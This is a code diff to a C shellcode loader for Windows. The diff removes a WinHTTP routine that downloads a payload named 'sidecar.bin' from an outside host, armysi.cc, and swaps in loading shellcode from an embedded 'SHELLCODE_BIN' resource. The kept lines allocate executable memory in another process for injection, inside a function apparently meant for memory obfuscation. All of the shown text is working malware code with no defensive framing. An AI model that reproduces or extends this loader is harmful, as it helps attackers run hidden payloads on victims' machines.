@@ -65,16 +65,6 @@ void PtrToHexStr(void* ptr, char* buf, int* idx) {
 }
 
 
-typedef HINTERNET (WINAPI *WinHttpOpen_t)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
-typedef HINTERNET (WINAPI *WinHttpConnect_t)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
-typedef HINTERNET (WINAPI *WinHttpOpenRequest_t)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
-typedef BOOL      (WINAPI *WinHttpSendRequest_t)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
-typedef BOOL      (WINAPI *WinHttpReceiveResponse_t)(HINTERNET, LPVOID);
-typedef BOOL      (WINAPI *WinHttpReadData_t)(HINTERNET, LPVOID, DWORD, LPDWORD);
-typedef BOOL      (WINAPI *WinHttpCloseHandle_t)(HINTERNET);
-
-
-
 
 void memoryobfuscation(){
 
@@ -149,39 +139,18 @@ void memoryobfuscation(){
 
     // build shc array
 
-    HMODULE hWinHttp = LoadLibraryA("winhttp.dll");
-    if (!hWinHttp) return 1;
-     
-    WinHttpOpen_t WinHttpOpen = (WinHttpOpen_t)GetProcAddress(hWinHttp, "WinHttpOpen");
-    WinHttpConnect_t WinHttpConnect = (WinHttpConnect_t)GetProcAddress(hWinHttp, "WinHttpConnect");
-    WinHttpOpenRequest_t WinHttpOpenRequest = (WinHttpOpenRequest_t)GetProcAddress(hWinHttp, "WinHttpOpenRequest");
-    WinHttpSendRequest_t WinHttpSendRequest = (WinHttpSendRequest_t)GetProcAddress(hWinHttp, "WinHttpSendRequest");
-    WinHttpReceiveResponse_t WinHttpReceiveResponse = (WinHttpReceiveResponse_t)GetProcAddress(hWinHttp, "WinHttpReceiveResponse");
-    WinHttpReadData_t WinHttpReadData = (WinHttpReadData_t)GetProcAddress(hWinHttp, "WinHttpReadData");
-    WinHttpCloseHandle_t WinHttpCloseHandle = (WinHttpCloseHandle_t)GetProcAddress(hWinHttp, "WinHttpCloseHandle");
-    
-    if (!WinHttpOpen || !WinHttpConnect || !WinHttpOpenRequest || !WinHttpSendRequest || !WinHttpReceiveResponse || !WinHttpReadData || !WinHttpCloseHandle)
-        return 2;
-    
-    HINTERNET hSession = WinHttpOpen(L"MyAgent", 1, NULL, NULL, 0); // INTERNET_OPEN_TYPE_PRECONFIG = 1
-    if (!hSession) return 3;
-            
-    HINTERNET hConnect = WinHttpConnect(hSession, L"armysi.cc", 80, 0); // 443 for HTTPS
-    if (!hConnect) return 4;
-     
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/sidecar.bin", NULL, NULL, NULL); //,WINHTTP_FLAG_SECURE);
-    if (!hRequest) return 5;
-    
-    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) return 6;
-    if (!WinHttpReceiveResponse(hRequest, NULL)) return 7;
-        
-    DWORD size = 0;
     DWORD sidecar_bin_len = 0;
-    unsigned char* sidecar_bin = (unsigned char*)VirtualAlloc(NULL, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-      
-    while (WinHttpReadData(hRequest, sidecar_bin + sidecar_bin_len, 0x1000, &size) && size > 0) {
-        sidecar_bin_len += size;
-    }
+    unsigned char* sidecar_bin = NULL;
+
+    HRSRC hRes = FindResource(NULL, "SHELLCODE_BIN", RT_RCDATA);
+
+    HGLOBAL hData = LoadResource(NULL, hRes);
+
+    void* pRes = LockResource(hData);
+
+    sidecar_bin_len = SizeofResource(NULL, hRes);
+
+    sidecar_bin = (unsigned char*)pRes;
 
     LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, sidecar_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
